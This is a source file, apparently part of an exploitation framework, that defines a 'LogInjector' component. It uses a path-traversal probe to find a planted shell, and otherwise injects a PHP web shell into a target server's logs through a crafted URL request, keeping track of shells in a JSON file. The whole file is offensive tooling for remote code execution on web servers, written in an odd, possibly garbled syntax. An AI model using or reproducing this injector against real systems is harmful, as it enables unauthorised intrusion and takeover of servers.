import('urllib2');

class init ExploitComponent LogInjector {
    repo = JsonRepository('logShells.json'),
    
    __init__: @(
        url,
        data = null,
        dot = '.',
        separator = '/',
        terminator = '') {
        self.probe = TraversalProbe('blank command', url, data, dot, separator, terminator);
        self.emitter = PhpShellEmitter();
    },

    findShell: @() {
        self.log('[i] Searching for shell');
        s = self.probe.scan();
        if (s != null) {
            self.log('[+] Shell found');
            if (__emit('self.url in self.repo.repo')) {
                tags = self.repo.repo[self.url];
                self.emitter.prefix = tags[0];
                self.emitter.suffix = tags[1];
            } else {
                print('[-] Error: could not find shell prefix/suffix');
            }
        }
        else self.log('[-] Shell not found');
        ret s;
    },

    sendShell: @() {
        self.log('[i] Injecting shell');
        
        u = self.url.__contains__('%s') ?
            self.url % self.emitter.emit() :
            self.url + '?' + self.emitter.emit();
        
        self.repo.add(
            self.url, 
            [self.emitter.prefix, self.emitter.suffix]);
            
        self.log('    Url: ' + u);
        urllib2.urlopen(u);
    },

    inject: @() {
        shell = self.findShell();
        if (shell == null) {
            self.sendShell();
            shell = self.findShell();
        }
        ret shell;
    },
};
